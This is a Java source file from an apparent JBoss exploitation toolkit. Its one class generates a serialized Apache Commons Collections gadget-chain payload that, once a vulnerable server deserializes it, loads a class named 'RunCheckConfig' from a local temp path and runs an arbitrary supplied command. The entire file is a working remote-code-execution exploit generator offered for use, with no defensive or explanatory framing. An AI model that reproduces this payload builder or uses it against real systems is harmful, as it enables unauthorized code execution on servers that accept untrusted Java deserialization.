package serializeTools.exploit.jboss;

import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.util.*;
import java.lang.annotation.*;
import java.io.*;
import java.lang.reflect.*;

public class GenCommadExecPayload {
	
	public byte[] genCommadExecPayload(String OS, String command) throws Exception {
		
		String ClassPath = "file:/c:/windows/temp/";
	    if (!OS.equals("Windows"))
	    {
	    	ClassPath = "file:../";
	    }
	    
		final Transformer[] transforms = { 
				new ConstantTransformer(java.net.URLClassLoader.class),
				new InvokerTransformer("getConstructor", 
						new Class[] { Class[].class },
						new Object[] { new Class[] { java.net.URL[].class } }
				),
				new InvokerTransformer("newInstance", 
						new Class[] { Object[].class },
						new Object[] { new Object[] { new java.net.URL[] { new java.net.URL(ClassPath) } } }
				),
				// loadClass String.class R
				new InvokerTransformer("loadClass", 
						new Class[] { String.class }, 
						new Object[] { "RunCheckConfig" }
				),
				new InvokerTransformer("getConstructor", 
						new Class[] { Class[].class },
						new Object[] { new Class[] { String.class } }
				),
				// invoke
				new InvokerTransformer("newInstance", 
						new Class[] { Object[].class },
						new Object[] { new String[] { command } }
				), 
		};
		final Transformer transformerChain = new ChainedTransformer(transforms);
		final Map<String, String> innerMap = new HashMap<String, String>();
		innerMap.put("value", "value");
		final Map<?, ?> outMap = TransformedMap.decorate(innerMap, null, transformerChain);
		final Class<?> cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		final Constructor<?> ctor = cls.getDeclaredConstructor(Class.class, Map.class);
		ctor.setAccessible(true);
		final Object instance = ctor.newInstance(Retention.class, outMap);
		final ByteArrayOutputStream byteArrayOut = new ByteArrayOutputStream();
		final ObjectOutputStream objectOutput = new ObjectOutputStream(byteArrayOut);
		objectOutput.writeObject(instance);
		objectOutput.flush();
		objectOutput.close();
		return byteArrayOut.toByteArray();
	}

}
